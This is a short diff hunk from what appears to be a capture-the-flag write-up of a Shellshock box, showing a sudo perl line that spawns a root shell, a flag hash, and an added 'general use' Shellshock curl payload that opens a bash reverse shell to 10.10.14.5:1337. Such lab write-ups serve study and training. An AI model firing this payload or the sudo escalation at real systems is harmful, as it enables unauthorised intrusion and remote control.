@@ -109,7 +109,10 @@ sudo perl -e 'exec "/bin/sh";'
 49eb3457c5f0411a37a9f907db03d92d
 ## Conclusion
 
-
+ShellShock Payload for general use: 
+```bash
+curl -H "user-agent: () { :; }; echo; /bin/sh -i >& /dev/tcp/10.10.14.5/1337 0>&1" 
+```
 ## Additional Notes
 
 0xdf talked about why the trailing slash is needed when requesting the /cgi-bin directory:
